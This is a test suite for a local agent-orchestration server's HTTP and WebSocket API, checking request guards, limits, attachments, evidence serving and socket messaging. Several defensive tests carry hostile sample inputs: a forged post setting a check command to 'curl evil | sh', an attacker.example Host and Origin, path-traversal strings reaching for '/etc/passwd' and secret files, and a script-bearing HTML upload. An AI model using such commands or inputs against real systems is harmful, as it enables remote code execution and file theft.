import { afterEach, describe, expect, spyOn, test } from 'bun:test';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  type AgentModel,
  applyStatePatch,
  ENGINE_PROTOCOL,
  KNOWN_AGENT_PROVIDERS,
  type OnboardingFlow,
  type ServerMessage,
  serializeState,
} from '@shinsa/core';
import { type ModelSource, Transcripts } from '../../src/agents/index.ts';
import type { ServerConfig } from '../../src/config/index.ts';
import { createWorktree } from '../../src/git/index.ts';
import { type Launcher, startServer } from '../../src/http/index.ts';
import type { EngineRestarter } from '../../src/instance/index.ts';
import { log as logger } from '../../src/log/index.ts';
import { Engine } from '../../src/runtime/index.ts';
import { EventLog, EvidenceStore } from '../../src/store/index.ts';
import {
  createGitRepo,
  createTempDir,
  createTestConfig,
  createTestOnboarding,
  until,
} from '../helpers/index.ts';

const running: (() => Promise<void>)[] = [];

afterEach(async () => {
  for (const stop of running.splice(0)) await stop();
});

function createModels(models: AgentModel[]) {
  return { listModels: () => Promise.resolve(models) } as unknown as ModelSource;
}

async function start(
  options: { config?: Partial<ServerConfig>; launch?: Launcher; restarter?: EngineRestarter } = {}
) {
  const config = createTestConfig(createTempDir(), options.config);
  const engine = new Engine(new EventLog(config.databasePath));
  const transcripts = new Transcripts(config.transcriptsDir);
  const evidence = new EvidenceStore(config.evidenceDir);
  const http = startServer({
    engine,
    config,
    transcripts,
    evidence,
    models: createModels([{ id: 'opus', label: 'Opus', description: 'x' }]),
    onboarding: createTestOnboarding(engine, config).onboarding,
    launch: options.launch,
    restarter: options.restarter,
  });
  running.push(http.stop);
  const base = `http://127.0.0.1:${http.server.port}`;
  const call = (path: string, init: RequestInit = {}) => fetch(`${base}${path}`, init);
  const post = (path: string, body: unknown, headers: Record<string, string> = {}) =>
    call(path, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...headers },
      body: JSON.stringify(body),
    });
  return { config, engine, transcripts, evidence, base, call, post };
}

async function startWithWorktree(launch?: Launcher) {
  const server = await start({ launch });
  const { repo } = await createGitRepo();
  const worktree = await createWorktree(repo, server.config.worktreesDir, 'task-xyz123', 'fix/thing', null);
  await server.engine.dispatch({
    type: 'repo.register',
    repo: { ...repo, checkCommands: [] },
    projectName: null,
  });
  const repoId = Object.keys(server.engine.state.repos)[0] ?? '';
  await server.engine.dispatch({ type: 'task.create', request: 'Fix the thing', repoId });
  const taskId = Object.keys(server.engine.state.tasks)[0] ?? '';
  await server.engine.dispatch({
    type: 'task.triage',
    taskId,
    title: 'Fix the thing',
    repoId,
    size: 'small',
    branch: 'fix/thing',
    waitsOn: [],
  });
  await server.engine.dispatch({
    type: 'worktree.ready',
    taskId,
    path: worktree.path,
    branch: worktree.branch,
  });
  return { ...server, taskId, worktree: worktree.path };
}

describe('a taken port', () => {
  test('names the port and where to change it, in the words the Mac app looks for', async () => {
    const other = Bun.serve({ port: 0, hostname: '127.0.0.1', fetch: () => new Response('other') });
    try {
      const port = other.port ?? 0;
      const attempt = start({ config: { port } });
      await expect(attempt).rejects.toThrow(`Is port ${port} in use?`);
      await expect(attempt).rejects.toThrow(/set another `port` in .*config\.json\./);
    } finally {
      other.stop(true);
    }
  });

  test('passes any other failure to listen through unchanged', async () => {
    await expect(start({ config: { port: 70_000 } })).rejects.not.toThrow('in use');
  });
});

describe('request size', () => {
  test('a body over 8 MB is refused before it is read', async () => {
    const { post, engine } = await start();
    const response = await post('/api/commands', { type: 'task.create', request: 'x'.repeat(9_000_000) });
    expect(response.status).toBe(413);
    expect(Object.keys(engine.state.tasks)).toEqual([]);
  });

  test('a body sent without a length is still held to 8 MB once read', async () => {
    const { base, engine } = await start();
    const chunks = [
      Buffer.from('{"type":"task.create","request":"'),
      Buffer.alloc(9_000_000, 120),
      Buffer.from('"}'),
    ];
    const response = await fetch(`${base}/api/commands`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: new ReadableStream({
        pull(controller) {
          const chunk = chunks.shift();
          if (chunk) controller.enqueue(chunk);
          else controller.close();
        },
      }),
    });
    expect(response.status).toBe(400);
    expect(await response.text()).toContain('over 8 MB');
    expect(Object.keys(engine.state.tasks)).toEqual([]);
  });

  test('an attachment upload may be larger, up to its own limit', async () => {
    const { post } = await start();
    const data = Buffer.alloc(6_300_000).toString('base64');
    const uploaded = await post('/api/attachments', { name: 'big.bin', data });
    expect(uploaded.status).toBe(200);
    expect(await uploaded.json()).toMatchObject({ name: 'big.bin', size: 6_300_000 });
  });
});

describe('the health endpoint', () => {
  test('says whether the event log replayed cleanly, and which Shinsa answered from where', async () => {
    const { call, engine, config } = await start();
    expect(await (await call('/api/health')).json()).toEqual({
      ok: true,
      seq: engine.state.seq,
      problems: [],
      version: '0.0.0',
      protocol: ENGINE_PROTOCOL,
      busy: false,
      restart: null,
      commit: null,
      installPath: join(import.meta.dirname, '../../../..'),
      dataDir: config.dataDir,
      pid: process.pid,
      startedAt: expect.any(Number),
      uptimeMs: expect.any(Number),
    });
  });
});

describe('the engine restart endpoint', () => {
  test('restarts the engine now or once agents are idle, when it runs in the background', async () => {
    const asked: string[] = [];
    const restarter = {
      request: (when: string) => {
        asked.push(when);
        return Promise.resolve({ restarting: when === 'now' });
      },
    } as unknown as EngineRestarter;
    const { post } = await start({ restarter });
    expect(await (await post('/api/engine/restart', { when: 'idle' })).json()).toEqual({ restarting: false });
    expect(await (await post('/api/engine/restart', { when: 'now' })).json()).toEqual({ restarting: true });
    expect(asked).toEqual(['idle', 'now']);
  });

  test('refuses an unknown moment, and a Shinsa that cannot restart from the app', async () => {
    const { post } = await start();
    const invalid = await post('/api/engine/restart', { when: 'later' });
    expect(invalid.status).toBe(400);
    expect(((await invalid.json()) as { error: { code: string } }).error.code).toBe('when_invalid');
    const unsupported = await post('/api/engine/restart', { when: 'now' });
    expect(((await unsupported.json()) as { error: { code: string } }).error.code).toBe(
      'restart_unsupported'
    );
  });
});

describe('the onboarding endpoints', () => {
  test('report the status, suggest folders, save the setup, check the tools and complete', async () => {
    const { call, post, config, engine } = await start({ config: { roots: [] } });
    expect(await (await call('/api/onboarding')).json()).toMatchObject({
      completed: false,
      roots: { source: 'discovered', effective: [] },
    });
    expect(await (await call('/api/onboarding/roots?refresh=1')).json()).toEqual({
      suggestions: [],
      truncated: false,
    });
    expect((await post('/api/onboarding/complete', {})).status).toBe(400);
    const saved = await post('/api/onboarding/setup', { roots: [config.home], mergeMethod: 'merge' });
    expect(await saved.json()).toMatchObject({ roots: { source: 'configured', configured: [config.home] } });
    expect(engine.state.settings.mergeMethod).toBe('merge');
    const refused = await post('/api/onboarding/setup', { roots: ['nope'] });
    expect(await refused.json()).toEqual({
      error: { code: 'roots_invalid', message: 'nope is not a full path.' },
    });
    for (const path of ['/api/onboarding/setup', '/api/onboarding/flow']) {
      expect(await (await post(path, [])).json()).toEqual({
        error: { code: 'body_invalid', message: 'The request body must be an object.' },
      });
    }
    const tools = (await (await call('/api/onboarding/prerequisites')).json()) as { ready: boolean };
    expect(tools.ready).toBe(true);
    expect(await (await post('/api/onboarding/privacy', {})).json()).toEqual({ ok: true });
    expect(await (await post('/api/onboarding/complete', {})).json()).toMatchObject({ completed: true });
  });

  test('run the setup: the first step, an answer, going back, a refused answer and a stale one', async () => {
    const { call, post, config } = await start({ config: { roots: [] } });
    const opened = (await (await call('/api/onboarding/flow')).json()) as OnboardingFlow;
    expect(opened).toMatchObject({ index: 0, step: { id: 'roots', multiple: true, options: [] } });
    const projects = (await (
      await post('/api/onboarding/flow', { type: 'answer', stepId: 'roots', values: [config.home] })
    ).json()) as OnboardingFlow;
    expect(projects.step?.id).toBe('projects');
    const back = (await (
      await post('/api/onboarding/flow', { type: 'open', stepId: 'roots' })
    ).json()) as OnboardingFlow;
    expect(back.step?.options).toEqual([
      { value: config.home, label: '~', detail: null, chosen: true, recommended: false },
    ]);
    const refused = (await (
      await post('/api/onboarding/flow', { type: 'answer', stepId: 'roots', values: ['/no/such'] })
    ).json()) as OnboardingFlow;
    expect(refused.step).toMatchObject({ id: 'roots', problem: '/no/such is not a folder on this machine.' });
    const stale = await post('/api/onboarding/flow', { type: 'answer', stepId: 'merge', values: ['squash'] });
    expect(stale.status).toBe(400);
    expect(await stale.json()).toEqual({
      error: { code: 'step_stale', message: 'That step is no longer open. Answer the step on screen.' },
    });
  });
});

describe('the request guard', () => {
  test('a foreign Host, a foreign Origin and a text/plain post are refused before anything runs', async () => {
    const { call } = await start();
    expect((await call('/api/queue', { headers: { host: 'attacker.example:5180' } })).status).toBe(403);
    expect((await call('/api/queue', { headers: { origin: 'https://attacker.example' } })).status).toBe(403);
    const simplePost = await call('/api/commands', {
      method: 'POST',
      headers: { 'content-type': 'text/plain' },
      body: JSON.stringify({
        type: 'repo.update',
        repoId: 'x',
        patch: { checkCommands: ['curl evil | sh'] },
      }),
    });
    expect(simplePost.status).toBe(415);
    expect((await call('/', { headers: { host: 'attacker.example' } })).status).toBe(403);
  });

  test('a request without an Origin, or from Shinsa’s own address, is taken without any key', async () => {
    const { post, engine } = await start();
    const task = { type: 'task.create', request: 'Add search', repoId: null };
    expect((await post('/api/commands', task)).status).toBe(200);
    expect((await post('/api/commands', task, { origin: 'http://localhost:5181' })).status).toBe(200);
    expect((await post('/api/commands', task, { origin: 'http://127.0.0.1:5180' })).status).toBe(200);
    expect((await post('/api/commands', task, { 'sec-fetch-site': 'cross-site' })).status).toBe(403);
    expect(Object.keys(engine.state.tasks)).toHaveLength(3);
  });
});

describe('commands', () => {
  test('a user command is dispatched and the new task id returned', async () => {
    const { post, engine } = await start();
    const response = await post('/api/commands', {
      type: 'task.create',
      request: 'Add search',
      repoId: null,
    });
    const body = (await response.json()) as { ok: boolean; taskId: string };
    expect(body.ok).toBe(true);
    expect(engine.state.tasks[body.taskId]?.request).toBe('Add search');
    expect(
      await (
        await post('/api/commands', { type: 'project.write', project: { name: 'A', color: 'blue' } })
      ).json()
    ).toEqual({
      ok: true,
      taskId: null,
      handle: null,
    });
  });

  test('every user command reaches the engine, including the ones only the task and settings pages send', async () => {
    const { post } = await start();
    const sent = [
      { type: 'suggestion.accept', taskId: 't', suggestionId: 's', waitsOnThis: false },
      { type: 'suggestion.dismiss', taskId: 't', suggestionId: 's' },
      { type: 'monitor.check_in_now', taskId: 't' },
      { type: 'run.snooze_silence', runId: 'r', until: 1 },
      { type: 'run.dismiss_silence', runId: 'r' },
      { type: 'schedule.enable', scheduleId: 's', enabled: false },
      { type: 'schedule.remove', scheduleId: 's' },
      { type: 'repo.remove', repoId: 'r' },
    ];
    for (const body of sent) {
      const answer = (await (await post('/api/commands', body)).json()) as { error?: { code: string } };
      expect(answer.error?.code ?? 'accepted').not.toBe('command_forbidden');
    }
  });

  test('system commands, junk and bad JSON are refused with a reason', async () => {
    const { post, call } = await start();
    for (const body of [{ type: 'run.end', runId: 'x' }, { type: 'repo.register' }, { type: 7 }]) {
      const response = await post('/api/commands', body);
      expect(response.status).toBe(400);
      expect(await response.json()).toEqual({
        error: { code: 'command_forbidden', message: 'Unknown command.' },
      });
    }
    for (const body of [null, 'task.create']) {
      expect(await (await post('/api/commands', body)).json()).toEqual({
        error: { code: 'command_invalid', message: 'A command must be an object.' },
      });
    }
    const broken = await call('/api/commands', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{',
    });
    expect(await broken.json()).toMatchObject({ error: { code: 'body_invalid' } });
    const rejected = await post('/api/commands', { type: 'task.create', request: ' ', repoId: null });
    expect(rejected.status).toBe(400);
  });

  test('a command sent again under the same Idempotency-Key is applied once and answers the same task', async () => {
    const { call, engine } = await start();
    const send = (key: string) =>
      call('/api/commands', {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'idempotency-key': key },
        body: JSON.stringify({ type: 'task.create', request: 'Add search', repoId: null }),
      });
    const first = (await (await send('k1')).json()) as { taskId: string };
    const again = (await (await send('k1')).json()) as { taskId: string };
    expect(again.taskId).toBe(first.taskId);
    expect(Object.keys(engine.state.tasks)).toEqual([first.taskId]);
    const tooLong = await send('k'.repeat(201));
    expect(tooLong.status).toBe(400);
    expect(await tooLong.json()).toEqual({
      error: { code: 'idempotency_key_invalid', message: 'The Idempotency-Key header is too long.' },
    });
  });
});

describe('read endpoints', () => {
  test('the queue, the models and unknown paths', async () => {
    const { call } = await start();
    expect(await (await call('/api/queue')).json()).toMatchObject({ decisions: [], working: [] });
    expect(await (await call('/api/models')).json()).toEqual([
      { id: 'opus', label: 'Opus', description: 'x' },
    ]);
    expect(await (await call('/api/providers')).json()).toEqual(KNOWN_AGENT_PROVIDERS);
    const missing = await call('/api/nothing');
    expect(missing.status).toBe(404);
    expect(
      (await call('/api/models', { method: 'POST', headers: { 'content-type': 'application/json' } })).status
    ).toBe(404);
  });

  test('an uploaded attachment is served back by its id and file name only', async () => {
    const { call, post } = await start();
    const response = await post('/api/attachments', {
      name: 'notes.txt',
      mimeType: 'text/plain',
      data: Buffer.from('hello').toString('base64'),
    });
    const attachment = (await response.json()) as { url: string; path: string; kind: string };
    expect(attachment.kind).toBe('file');
    const served = await call(attachment.url);
    expect(await served.text()).toBe('hello');
    expect(served.headers.get('cache-control')).toBe('private, max-age=31536000, immutable');
    expect((await call(attachment.url, { headers: { range: 'bytes=1-2' } })).status).toBe(206);
    expect((await call('/api/attachments/..%2Fshinsa.sqlite')).status).toBe(404);
    expect((await post('/api/attachments', { name: 'a.txt', data: '' })).status).toBe(400);
  });

  test('an uploaded page downloads in a sandbox and an image shows inline, neither can run script', async () => {
    const { call, post } = await start();
    const upload = async (name: string, mimeType: string, body: string) => {
      const response = await post('/api/attachments', {
        name,
        mimeType,
        data: Buffer.from(body).toString('base64'),
      });
      return call(((await response.json()) as { url: string }).url);
    };
    const page = await upload('report.html', 'text/html', '<script>fetch("/api/commands")</script>');
    expect(page.headers.get('content-type')).toStartWith('text/html');
    expect(page.headers.get('content-disposition')).toBe('attachment; filename="report.html"');
    expect(page.headers.get('content-security-policy')).toBe("default-src 'none'; sandbox");
    expect(page.headers.get('x-content-type-options')).toBe('nosniff');
    const image = await upload('shot.png', 'image/png', 'png bytes');
    expect(image.headers.get('content-disposition')).toBeNull();
    expect(image.headers.get('content-security-policy')).toBe("default-src 'none'; sandbox");
  });

  test('evidence is served by its task, round and name only, cached and in ranges', async () => {
    const { call, evidence, config } = await start();
    const uri = evidence.writeText('proof of work', { taskId: 'task-1', round: 1 }, 'Proof');
    writeFileSync(join(config.dataDir, 'secret.txt'), 'secret');
    const whole = await call(uri);
    expect(await whole.text()).toBe('proof of work');
    expect(whole.headers.get('cache-control')).toBe('private, max-age=31536000, immutable');
    expect(whole.headers.get('accept-ranges')).toBe('bytes');
    const ranged = (range: string) => call(uri, { headers: { range } });
    const middle = await ranged('bytes=6-7');
    expect(middle.status).toBe(206);
    expect(await middle.text()).toBe('of');
    expect(middle.headers.get('content-range')).toBe('bytes 6-7/13');
    expect(await (await ranged('bytes=9-')).text()).toBe('work');
    expect(await (await ranged('bytes=-4')).text()).toBe('work');
    expect(await (await ranged('bytes=0-99')).text()).toBe('proof of work');
    for (const range of ['bytes=20-30', 'bytes=-0', 'bytes=-', 'items=0-1', 'bytes=5-2']) {
      const refused = await ranged(range);
      expect(refused.status).toBe(416);
      expect(refused.headers.get('content-range')).toBe('bytes */13');
    }
    for (const path of [
      '/api/evidence/..%2Fsecret.txt',
      '/api/evidence/..',
      '/api/evidence/missing.png',
      '/api/evidence/task-1/round-1/missing.txt',
      '/api/evidence/task-1/..%2F..%2Fsecret.txt',
    ]) {
      expect((await call(path)).status).toBe(404);
    }
  });
});

describe('worktree endpoints', () => {
  test('open runs the editor at a line, Terminal or Finder, and nothing else', async () => {
    const launched: string[][] = [];
    const launch: Launcher = (command) => {
      launched.push(command);
      return Promise.resolve({ ok: true, code: 0, stdout: '', stderr: '', timedOut: false });
    };
    const { post, taskId, worktree, config } = await startWithWorktree(launch);
    config.editor = 'zed';
    const open = (body: unknown) => post(`/api/tasks/${taskId}/open`, body);
    expect(await (await open({ target: 'editor', path: 'README.md', line: 3 })).json()).toEqual({ ok: true });
    await open({ target: 'editor', path: 'README.md' });
    await open({ target: 'editor', path: '../../etc/passwd', line: 1.5 });
    await open({ target: 'terminal' });
    await open({ target: 'finder', path: 7 });
    expect((await open({ target: 'constructor' })).status).toBe(400);
    expect((await open(null)).status).toBe(400);
    expect((await post('/api/tasks/nope/open', { target: 'finder' })).status).toBe(404);
    expect(launched.map((command) => command.slice(0, 2).join(' '))).toEqual([
      `zed ${worktree}`,
      `zed ${worktree}`,
      `zed ${worktree}`,
      'open -a',
      `open ${worktree}`,
    ]);
    expect(launched[0]?.at(-1)?.endsWith('README.md:3')).toBe(true);
    expect(launched[1]?.at(-1)?.endsWith('README.md')).toBe(true);
    expect(launched[2]).toHaveLength(2);
    config.editor = null;
    await open({ target: 'editor' });
    expect(['code', 'cursor']).toContain(launched.at(-1)?.[0] ?? '');
  });

  test('the default launcher really runs the command', async () => {
    const log = join(createTempDir(), 'open.log');
    process.env.FAKE_OPEN_LOG = log;
    try {
      const { post, taskId } = await startWithWorktree();
      expect(await (await post(`/api/tasks/${taskId}/open`, { target: 'finder' })).json()).toEqual({
        ok: true,
      });
    } finally {
      delete process.env.FAKE_OPEN_LOG;
    }
  });
});

describe('the web app', () => {
  test('serves built files, falls back to index.html, and says when it is not built', async () => {
    const { call, config } = await start();
    expect((await call('/')).status).toBe(503);
    mkdirSync(join(config.webDir, 'assets'), { recursive: true });
    writeFileSync(join(config.webDir, 'index.html'), '<html>app</html>');
    writeFileSync(join(config.webDir, 'assets', 'app.js'), 'run()');
    writeFileSync(join(config.dataDir, 'secret.txt'), 'secret');
    expect(await (await call('/assets/app.js')).text()).toBe('run()');
    expect(await (await call('/tasks/abc')).text()).toBe('<html>app</html>');
    expect(await (await call('/')).text()).toBe('<html>app</html>');
    expect(await (await call('/..%2F..%2Fdata%2Fsecret.txt')).text()).toBe('<html>app</html>');
  });
});

describe('the socket', () => {
  function connect(base: string, origin: string | null = 'http://localhost:5181') {
    const socket = new WebSocket(base.replace('http', 'ws').concat('/ws'), {
      headers: origin ? { origin } : {},
    });
    const messages: ServerMessage[] = [];
    socket.addEventListener('message', (event) =>
      messages.push(JSON.parse(String(event.data)) as ServerMessage)
    );
    const opened = new Promise<void>((resolve, reject) => {
      socket.addEventListener('open', () => resolve());
      socket.addEventListener('error', () => reject(new Error('socket refused')));
    });
    return { socket, messages, opened };
  }

  test('a socket from another site or without an Origin is refused', async () => {
    const { base, call } = await start();
    await expect(connect(base, 'https://attacker.example').opened).rejects.toThrow('socket refused');
    await expect(connect(base, null).opened).rejects.toThrow('socket refused');
    expect((await call('/ws', { headers: { origin: 'http://localhost:5181' } })).status).toBe(400);
  });

  test('state on connect, a patch on every change, acks for commands, transcripts on subscription', async () => {
    const { base, engine, transcripts } = await start();
    const unfollowed: string[] = [];
    const follow = transcripts.follow.bind(transcripts);
    transcripts.follow = (runId) => {
      const unfollow = follow(runId);
      return () => {
        unfollowed.push(runId);
        unfollow();
      };
    };
    const client = connect(base);
    await client.opened;
    await until('the first state', () => client.messages.length === 2);
    expect(client.messages.map((message) => message.type)).toEqual(['state', 'surfaces']);
    client.socket.send(
      JSON.stringify({
        type: 'command',
        id: 'c1',
        command: { type: 'task.create', request: 'Do it', repoId: null },
      })
    );
    client.socket.send(
      JSON.stringify({ type: 'command', id: 'c2', command: { type: 'run.end', runId: 'x' } })
    );
    client.socket.send(
      JSON.stringify({
        type: 'command',
        id: 'c3',
        command: { type: 'task.create', request: ' ', repoId: null },
      })
    );
    client.socket.send('not json');
    client.socket.send(JSON.stringify({ nope: true }));
    await until('the acks', () => client.messages.filter((message) => message.type === 'ack').length === 3);
    const acks = client.messages.filter((message) => message.type === 'ack');
    expect(acks.map((ack) => ack.type === 'ack' && [ack.id, ack.error?.code ?? null])).toEqual([
      ['c1', null],
      ['c2', 'command_forbidden'],
      ['c3', expect.any(String)],
    ]);
    const first = client.messages.find((message) => message.type === 'state');
    let state = first?.type === 'state' ? first.state : null;
    for (const message of client.messages) {
      if (message.type === 'state.patch' && state) state = applyStatePatch(state, message.patch);
    }
    expect(Object.keys(state?.tasks ?? {})).toHaveLength(1);
    expect(state).toEqual(JSON.parse(JSON.stringify(serializeState(engine.state))));
    client.socket.send(JSON.stringify({ type: 'state.sync' }));
    await until(
      'the state again',
      () => client.messages.filter((message) => message.type === 'state').length === 2
    );

    transcripts.record('run-1', { type: 'agent', phase: 'interim', text: 'before' });
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-1' }));
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-1', from: 1 }));
    await until(
      'the transcript',
      () => client.messages.filter((message) => message.type === 'transcript').length === 2
    );
    expect(
      client.messages.flatMap((message) =>
        message.type === 'transcript' ? [[message.start, message.entries.length]] : []
      )
    ).toEqual([
      [0, 1],
      [1, 0],
    ]);
    transcripts.record('run-1', { type: 'agent', phase: 'interim', text: 'live' });
    transcripts.record('run-2', { type: 'agent', phase: 'interim', text: 'other run' });
    await until('the live entry', () =>
      client.messages.some(
        (message) => message.type === 'transcript' && message.start === 1 && message.entries.length === 1
      )
    );
    client.socket.send(JSON.stringify({ type: 'transcript.unsubscribe', runId: 'run-1' }));
    client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-3' }));
    await until('the second subscription', () =>
      client.messages.some((message) => message.type === 'transcript' && message.runId === 'run-3')
    );
    expect(
      client.messages.some((message) => message.type === 'transcript' && message.runId === 'run-2')
    ).toBe(false);
    client.socket.close();
    await until('the server to let go of the transcripts', () => unfollowed.includes('run-3'));
    await engine.dispatch({ type: 'project.write', project: { name: 'After close', color: 'blue' } });
  });

  test('every page learns on connect and on each change whether the desktop app is connected', async () => {
    const { base } = await start();
    const desktopNews = (messages: ServerMessage[]) =>
      messages.flatMap((message) => (message.type === 'surfaces' ? [message.desktop] : []));
    const page = connect(base);
    await page.opened;
    await until('the page to hear no app is connected', () => desktopNews(page.messages).length === 1);
    page.socket.send(JSON.stringify({ type: 'hello', surface: 'browser' }));
    page.socket.send(JSON.stringify({ type: 'hello', surface: 'floaty' }));

    const app = connect(base);
    await app.opened;
    app.socket.send(JSON.stringify({ type: 'hello', surface: 'desktop' }));
    await until('the page to hear the app arrive', () => desktopNews(page.messages).length === 2);
    expect(desktopNews(app.messages)).toEqual([false, true]);

    const late = connect(base);
    await late.opened;
    await until('a late page to hear the app is there', () => desktopNews(late.messages).length === 1);
    expect(desktopNews(late.messages)).toEqual([true]);

    app.socket.close();
    await until('the pages to hear the app leave', () => desktopNews(late.messages).length === 2);
    expect(desktopNews(page.messages)).toEqual([false, true, false]);
    expect(desktopNews(late.messages)).toEqual([true, false]);
    page.socket.close();
    late.socket.close();
  });

  test('a command resent on a new socket under the same id is applied once', async () => {
    const { base, engine } = await start();
    const message = JSON.stringify({
      type: 'command',
      id: 'resent',
      command: { type: 'task.create', request: 'Do it once', repoId: null },
    });
    for (const attempt of [1, 2]) {
      const client = connect(base);
      await client.opened;
      client.socket.send(message);
      await until(`ack ${attempt}`, () => client.messages.some((entry) => entry.type === 'ack'));
      expect(client.messages.find((entry) => entry.type === 'ack')).toEqual({
        type: 'ack',
        id: 'resent',
        error: null,
      });
      client.socket.close();
    }
    expect(Object.values(engine.state.tasks).map((task) => task.request)).toEqual(['Do it once']);
  });

  test('a socket message that fails after parsing is logged', async () => {
    const { base, transcripts } = await start();
    const original = transcripts.readEntries.bind(transcripts);
    transcripts.readEntries = () => {
      throw new Error('disk gone');
    };
    const error = spyOn(logger, 'error');
    try {
      const client = connect(base);
      await client.opened;
      client.socket.send(JSON.stringify({ type: 'transcript.subscribe', runId: 'run-1' }));
      await until('the failure to be logged', () =>
        error.mock.calls.some(([message]) => message === '[Socket] Message failed')
      );
      expect(client.messages.map((message) => message.type)).toEqual(['state', 'surfaces']);
      client.socket.close();
    } finally {
      error.mockRestore();
      transcripts.readEntries = original;
    }
  });
});
